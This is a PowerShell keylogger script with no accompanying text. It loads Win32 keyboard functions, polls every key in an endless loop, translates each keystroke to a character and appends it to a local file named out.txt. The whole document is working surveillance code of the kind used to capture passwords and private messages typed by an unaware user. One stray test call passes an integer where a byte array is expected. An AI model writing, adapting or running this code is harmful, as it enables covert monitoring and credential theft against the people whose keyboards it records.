
#Import checking key status.
$Sig1 = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
'@
Add-Type -MemberDefinition $Sig1 -Name Keyboard -Namespace PsOneApi

#Set of win-apis to get "correct values" for ToUnicode - to translate key_num better
$Sig2 = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
'@
$Sig3 = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
'@
$Sig4 = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
# Map Virtual Key
Add-Type -MemberDefinition $Sig2 -Name MapVkey -Namespace PsOneApi
# Map Keboard State for multi button operations
Add-Type -MemberDefinition $Sig3 -Name GetKBS -Namespace PsOneApi
# Translate key to unicode
Add-Type -MemberDefinition $Sig4 -Name ToUni -Namespace PsOneApi



Write-Host "Running..."
try{
    while($true){
        Start-Sleep -Milliseconds 40
        for ($key_num=8; $key_num -le 254; $key_num++){
            $key_pressed = [PsOneApi.Keyboard]::GetAsyncKeyState($key_num)
            if ($key_pressed -eq -32767){
                #Get virtual key (also differentiate between right and left)
                #The number 3 - The uCode parameter is a scan code and is translated into a virtual-key code that distinguishes between left- and right-hand keys.
                $vk = [PsOneApi.MapVkey]::MapVirtualKey($key_num,3)
                #Get key states to check for multipress
                $kb = New-Object Byte[] 256
                $kbs = [PsOneApi.GetKBS]::GetKeyboardState($kb)
                #Translate to unicode - Uses keynum vk and kbs to save the unicode to t_char (translated char) (0 is flags for menu)
                #Buffer for growing string
                $t_char = New-Object -TypeName System.Text.StringBuilder
                $uni_test = [PsOneApi.ToUni]::ToUnicode(81,34,1,$t_char,$t_char.Capacity,0)
                $uni_operation = [PsOneApi.ToUni]::ToUnicode($key_num,$vk,$kb,$t_char,$t_char.Capacity,0)
                if ($uni_operation){
                    #Saving every key to file
                    Add-Content -Path '.\out.txt' -Value $t_char -NoNewLine
                }
            }
        }
    }
}
finally{
}
